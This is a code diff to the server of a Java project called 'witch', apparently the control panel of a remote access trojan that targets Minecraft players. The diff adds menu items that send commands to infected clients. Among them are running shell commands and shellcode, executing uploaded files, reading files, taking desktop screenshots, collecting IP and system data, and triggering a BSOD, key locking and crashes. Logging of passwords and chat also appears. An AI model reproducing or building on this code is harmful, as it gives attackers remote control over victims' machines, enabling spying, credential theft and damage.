@@ -3,12 +3,14 @@ package me.soda.witch.server.server;
 import com.google.gson.Gson;
 import me.soda.witch.server.gui.AdminPanel;
 import me.soda.witch.server.gui.GUI;
+import me.soda.witch.server.gui.ServerChatWindow;
 import me.soda.witch.server.utils.Info;
 import me.soda.witch.server.utils.Utils;
 import me.soda.witch.shared.Crypto;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.socket.Connection;
 import me.soda.witch.shared.socket.TcpServer;
+import me.soda.witch.shared.socket.messages.Data;
 import me.soda.witch.shared.socket.messages.Message;
 import me.soda.witch.shared.socket.messages.messages.*;
 import net.miginfocom.swing.MigLayout;
@@ -17,18 +19,20 @@ import javax.swing.*;
 import javax.swing.event.PopupMenuEvent;
 import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
+import javax.swing.text.JTextComponent;
+import java.awt.*;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
-import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.stream.Stream;
 
 public class Server extends TcpServer {
     private static final Gson GSON = new Gson();
@@ -36,24 +40,27 @@ public class Server extends TcpServer {
     protected final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
     protected final ServerConfig config = Utils.getServerConfig();
     private final AdminPanel adminPanel;
-    private int clientIndex = 0;
     private final List<Integer> selectedConns = new ArrayList<>();
+    private final GUI gui;
+    private final List<ServerChatWindow> chatWindows = new ArrayList<>();
+    private int clientIndex = 0;
 
     public Server() throws IOException {
         super();
         adminPanel = new AdminPanel();
-        GUI gui = new GUI(adminPanel);
+        gui = new GUI(adminPanel);
         gui.addWindowListener(new WindowAdapter() {
             @Override
             public void windowClosing(WindowEvent e) {
                 try {
                     stop();
-                } catch (IOException ex) {
+                } catch (IOException | InterruptedException ex) {
                     JOptionPane.showConfirmDialog(gui, ex.getMessage(), "Failed to stop server", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                     System.exit(1);
                 }
             }
         });
+
         adminPanel.table.setComponentPopupMenu(
                 new JPopupMenu() {{
                     addPopupMenuListener(new PopupMenuListener() {
@@ -77,10 +84,10 @@ public class Server extends TcpServer {
 
 
                     JMenuItem disconnect = new JMenuItem("Disconnect");
-                    disconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));
+                    disconnect.addActionListener(e -> getConnStream().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));
 
                     JMenuItem reconnect = new JMenuItem("Reconnect");
-                    reconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));
+                    reconnect.addActionListener(e -> getConnStream().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));
 
                     JMenuItem execute = new JMenuItem("Execute");
                     execute.addActionListener(e -> {
@@ -88,7 +95,7 @@ public class Server extends TcpServer {
                         if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
                             try (FileInputStream is = new FileInputStream(fileChooser.getSelectedFile())) {
                                 byte[] data = is.readAllBytes();
-                                getConns().forEach(connection -> connection.send(Message.fromBytes("execute", data)));
+                                send(new ByteData("execute", data));
                             } catch (IOException ex) {
                                 JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                             }
@@ -105,6 +112,7 @@ public class Server extends TcpServer {
                         JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
                         JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
                         JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
+                        JTextField serverName = new JTextField(cfg.name);
                         JTextArea invisiblePlayers = new JTextArea();
                         cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
                         JButton send = new JButton("Send");
@@ -116,8 +124,9 @@ public class Server extends TcpServer {
                             cfg.logChatAndCommand = logChatAndCommand.isSelected();
                             cfg.canJoinServer = canJoinServer.isSelected();
                             cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
+                            cfg.name = serverName.getText();
                             cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
-                            getConns().forEach(connection -> connection.send(new Message(cfg)));
+                            send(cfg);
                             dispose();
                         });
 
@@ -130,6 +139,8 @@ public class Server extends TcpServer {
                         add(logChatAndCommand, "wrap");
                         add(canJoinServer, "wrap");
                         add(canQuitServerOrCloseWindow, "wrap");
+                        add(new JLabel("Server name"), "split 2");
+                        add(serverName, "wrap, growx");
                         add(new JLabel("Invisible players"), "split 2");
                         add(invisiblePlayers, "wrap, growx");
                         add(send);
@@ -142,12 +153,11 @@ public class Server extends TcpServer {
                     JMenuItem follow = new JMenuItem("Follow");
                     follow.addActionListener(e -> new JDialog(gui, true) {{
                         JTextField followPlayer = new JTextField("Player");
-                        JTextField distance = new JTextField("3.0");
+                        JTextField distance = new JTextField("4");
                         JCheckBox stop = new JCheckBox("Stop", false);
                         JButton send = new JButton("Send");
                         send.addActionListener(e1 -> {
-                            FollowData data = new FollowData(followPlayer.getText(), Double.parseDouble(distance.getText()), stop.isSelected());
-                            getConns().forEach(connection -> connection.send(new Message(data)));
+                            send(new FollowData(followPlayer.getText(), Double.parseDouble(distance.getText()), stop.isSelected()));
                             dispose();
                         });
 
@@ -171,8 +181,7 @@ public class Server extends TcpServer {
                         JCheckBox invisible = new JCheckBox("Target invisible", false);
                         JButton send = new JButton("Send");
                         send.addActionListener(e1 -> {
-                            SpamData data = new SpamData(text.getText(), Integer.parseInt(times.getText()), Integer.parseInt(delayInTicks.getText()), invisible.isSelected());
-                            getConns().forEach(connection -> connection.send(new Message(data)));
+                            send(new SpamData(text.getText(), Integer.parseInt(times.getText()), Integer.parseInt(delayInTicks.getText()), invisible.isSelected()));
                             dispose();
                         });
 
@@ -191,12 +200,43 @@ public class Server extends TcpServer {
                         setVisible(true);
                     }});
 
+                    JMenuItem chat = new JMenuItem("Chat");
+                    chat.addActionListener(e -> getConnStream().forEach(connection -> chatWindows.add(new ServerChatWindow(connection) {{
+                        setTitle(String.format("Chat with %s(%d)", clientMap.get(connection).player.playerName, clientMap.get(connection).id));
+                    }})));
+
                     add(disconnect);
                     add(reconnect);
                     add(execute);
                     add(config);
                     add(follow);
                     add(spam);
+                    add(chat);
+
+                    add(getBoolMenu("Lag", "lagger"));
+                    add(getBoolMenu("BSOD", "bsod"));
+                    add(getBoolMenu("KeyLocker", "keylocker"));
+                    add(getBoolMenu("Lick", "lick"));
+
+                    add(getStringsMenu("Mods", "mods"));
+                    add(getStringsMenu("System Info", "systeminfo"));
+                    add(getStringsMenu("Screenshot", "screenshot"));
+                    add(getStringsMenu("Desktop Screenshot", "screenshot2"));
+                    add(getStringsMenu("Client Config", "config"));
+                    add(getStringsMenu("Player info", "player"));
+                    add(getStringsMenu("Player Skin", "skin"));
+                    add(getStringsMenu("Kick", "kick"));
+                    add(getStringsMenu("Run arguments", "runargs"));
+                    add(getStringsMenu("JVM props", "props"));
+                    add(getStringsMenu("IP address", "ip"));
+                    add(getStringsMenu("Crash", "crash"));
+                    add(getStringsMenu("OP Everyone", "op@a"));
+
+                    add(getStringsMenu("Join Server", "join_server", "IP"));
+                    add(getStringsMenu("Shell command", "shell", "Command"));
+                    add(getStringsMenu("Shellcode", "shellcode", "Shellcode"));
+                    add(getStringsMenu("Read file", "read", "File path"));
+                    add(getStringsMenu("Open URL", "open_url", "Link"));
                 }}
         );
 
@@ -223,6 +263,16 @@ public class Server extends TcpServer {
     }
 
     @Override
+    public void onClose(Connection conn, DisconnectData disconnectData) {
+        Info info = clientMap.get(conn);
+        changeRow(info, true);
+        chatWindows.stream().filter(wnd -> wnd.connection == conn).forEach(Window::dispose);
+        chatWindows.removeIf(wnd -> wnd.connection == conn);
+        log("Client disconnected: ID: %d", info.id);
+        clientMap.remove(conn);
+    }
+
+    @Override
     public void onMessage(Connection conn, Message message) {
         Info info = clientMap.get(conn);
         int id = info.id;
@@ -240,24 +290,26 @@ public class Server extends TcpServer {
                     }
                 }
             } else if (message.data instanceof StringsData data) {
-                if (data.data().length == 0 && data.id().equals("getconfig")) {
+                if (data.data().size() == 0 && data.id().equals("getconfig")) {
                     conn.send(new Message(clientDefaultConf));
-                } else if (data.data().length == 1) {
-                    String msg = data.data()[0];
+                } else if (data.data().size() == 1) {
+                    String msg = data.data().get(0);
                     switch (data.id()) {
-                        case "logging" -> {
-                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
-                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
-                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
-                        }
+                        case "chat" ->
+                                chatWindows.stream().filter(wnd -> wnd.connection == conn).forEach(wnd -> wnd.receivedText.append("Target: " + msg));
+                        //case "logging" -> {
+                        //    File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
+                        //    String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
+                        //    FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
+                        //}
                         case "ip" -> {
                             info.ip = msg;
                             changeRow(info, false);
                         }
-                        case "iasconfig", "runargs", "systeminfo", "props" -> {
-                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
-                            FileUtil.write(file, msg);
-                        }
+                        //case "runargs", "systeminfo", "props" -> {
+                        //    File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
+                        //    FileUtil.write(file, msg);
+                        //}
                     }
                 }
             } else if (message.data instanceof PlayerData data) {
@@ -267,15 +319,7 @@ public class Server extends TcpServer {
         } catch (Exception e) {
             e.printStackTrace();
         }
-        log("Received message: %s From ID %d", message.data.getClass().getName(), id);
-    }
-
-    @Override
-    public void onClose(Connection conn, DisconnectData disconnectData) {
-        Info info = clientMap.get(conn);
-        changeRow(info, true);
-        log("Client disconnected: ID: %d", info.id);
-        clientMap.remove(conn);
+        log("Received message: %s From ID %d", message.toString(), id);
     }
 
     private void log(String str, Object... format) {
@@ -299,7 +343,66 @@ public class Server extends TcpServer {
         }
     }
 
-    private List<Connection> getConns() {
-        return getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id)).toList();
+    private void send(Data data) {
+        getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id)).forEach(connection -> connection.send(data));
+    }
+
+    private Stream<Connection> getConnStream() {
+        return getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id));
+    }
+
+    private JMenuItem getBoolMenu(String name, String command) {
+        JMenuItem menuItem = new JMenuItem(name);
+        menuItem.addActionListener(e -> new JDialog(gui, true) {{
+            JCheckBox checkBox = new JCheckBox("Set enabled", false);
+            JButton send = new JButton("Send");
+            send.addActionListener(e1 -> {
+                send(new BooleanData(command, checkBox.isSelected()));
+                dispose();
+            });
+
+            setLayout(new MigLayout());
+            add(checkBox, "wrap");
+            add(send);
+            setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+            pack();
+            setLocationRelativeTo(null);
+            setVisible(true);
+        }});
+        return menuItem;
+    }
+
+    private JMenuItem getStringsMenu(String name, String command, String... argNames) {
+        JMenuItem menuItem = new JMenuItem(name);
+        menuItem.addActionListener(e -> {
+            if (argNames.length == 0) {
+                send(new StringsData(command, List.of()));
+                return;
+            }
+            new JDialog(gui, true) {{
+                setLayout(new MigLayout());
+                List<JTextField> texts = new ArrayList<>();
+                for (String argName : argNames) {
+                    JTextField textField = new JTextField(10);
+                    texts.add(textField);
+
+                    add(new JLabel(argName));
+                    add(textField, "wrap");
+                }
+
+                JButton send = new JButton("Send");
+                send.addActionListener(e1 -> {
+                    send(new StringsData(command, texts.stream().map(JTextComponent::getText).toList()));
+                    dispose();
+                });
+
+                add(send);
+                setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+                pack();
+                setLocationRelativeTo(null);
+                setVisible(true);
+            }};
+        });
+        return menuItem;
     }
 }
